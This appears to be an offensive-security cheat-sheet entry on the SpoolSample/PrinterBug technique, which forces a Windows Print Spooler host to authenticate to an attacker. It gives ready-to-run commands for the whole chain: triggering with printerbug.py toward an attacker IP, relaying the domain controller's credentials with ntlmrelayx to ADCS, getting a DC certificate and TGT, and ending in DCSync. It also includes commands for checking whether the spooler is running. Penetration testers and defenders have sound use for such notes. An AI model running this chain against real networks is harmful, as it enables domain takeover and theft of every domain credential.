# 03.37 SpoolSample PrinterBug

> Force a Windows host with Print Spooler service to authenticate to attacker — classic NTLM relay primitive.

## Overview

SpoolSample exploits MS-RPRN (Print Remote Procedure Call). Calls RpcRemoteFindFirstPrinterChangeNotificationEx with a UNC path back to the attacker, causing the target's machine account to authenticate over SMB. Used as a coercion primitive in NTLM relay chains. PrinterBug is the original concept; SpoolSample is the canonical implementation. Combine with ntlmrelayx for relay-to-ADCS or relay-to-LDAP attacks.

## Steps

- **Step 1** - Target must have Print Spooler service running.
- **Step 2** - Start ntlmrelayx pointing at relay target.
- **Step 3** - Run SpoolSample with attacker as catcher.
- **Step 4** - Captured auth gets relayed.

## Commands

### Get SpoolSample

```bash
git clone https://github.com/leechristensen/SpoolSample
# Build with Visual Studio, or use the precompiled SpoolSample.exe in releases
```

### Python implementation

```bash
git clone https://github.com/dirkjanm/krbrelayx
# Uses printerbug.py
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET-HOST> <ATTACKER-IP>
```

### Full attack chain (relay to ADCS)

```bash
# Terminal 1 — relay
impacket-ntlmrelayx -t http://<CA-FQDN>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
# Terminal 2 — trigger
python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET-DC> <ATTACKER-IP>
# ntlmrelayx receives DC$ auth, requests cert from ADCS
# Use cert with Rubeus to get DC$ TGT → DCSync
```

### Check if Spooler running on target

```bash
rpcdump.py @<TARGET> | grep -i spool
# Or via nxc
nxc smb <TARGET> -u <USER> -p <PASS> -M printerbug
```
